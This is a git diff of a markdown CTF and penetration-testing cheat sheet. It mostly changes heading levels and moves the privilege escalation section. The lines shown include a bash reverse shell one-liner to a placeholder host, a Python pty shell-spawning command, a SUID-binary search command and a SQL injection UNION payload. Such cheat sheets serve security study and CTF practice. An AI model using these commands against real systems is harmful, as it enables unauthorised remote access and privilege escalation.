@@ -35,7 +35,7 @@
 - ```xxd [file]```: Read binary data of a file
 
 <a name="recon"></a>
-# Reconnaissance
+## Reconnaissance
 
 <a name="nmap"></a>
 ### Nmap
@@ -50,12 +50,35 @@
 ### Nikto
 
 <a name="reverseshell"></a>
-# Useful Reverse Shell
+## Useful Reverse Shell
 
 ```bash -i >& /dev/tcp/[host]/[port] 0>&1```
 
+<a name ="privesc"></a>
+## Privilege Escalation
+
+<a name="shellspawn"></a>
+### Shell Spawning 
+
+```python
+python -c 'import pty;pty.spawn("/bin/sh")'
+```
+
+
+<a name="suid"></a>
+### SUID
+
+To find file with SUID bit. Simply use following command:
+
+```
+find [directory] -perm -u=s -type f 2>/dev/null
+```
+
+<a name="ctfmethod"></a>
+# CTF Methodlogy
+
 <a name="webapp"></a>
-# Web App 
+## Web App 
 
 <a name="sqlinj"></a>
 ### SQL Injection
@@ -108,26 +131,4 @@ SELECT * from TABLE where USERNAME='' UNION SELECT 1 --AND PASSWORD='PASSWORD';
 
 <a name ="subdomain"></a>
 ### Subdomain Takeover
-
-<a name ="privesc"></a>
-# Privilege Escalation
-
-<a name="shellspawn"></a>
-### Shell Spawning 
-
-```python
-python -c 'import pty;pty.spawn("/bin/sh")'
-```
-
-
-<a name="suid"></a>
-### SUID
-
-If you type ```ls -al``` in console, there are something like ```rwxr--rwx root root``` next to your file name. So, what does it mean? It 
-
-To find file with SUID bit. Simply use following command:
-
-```
-find [directory] -perm -u=s -type f 2>/dev/null
-```
 
